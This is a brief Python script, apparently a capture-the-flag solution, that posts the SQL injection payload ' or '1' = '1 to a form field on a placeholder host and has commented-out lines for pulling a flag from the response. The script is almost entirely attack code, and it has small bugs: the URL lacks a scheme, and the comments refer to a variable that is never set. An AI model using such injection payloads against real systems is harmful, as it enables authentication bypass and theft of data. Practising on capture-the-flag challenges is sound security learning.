#!/usr/bin/env python
import requests

re = requests.post('target.com', data={"submit":"Submit", "input":"' or '1' = '1"})
#flag = r.text.split("fl4g_giv3r")[1]
#flag = flag.split("<br>")[1]
print(re)
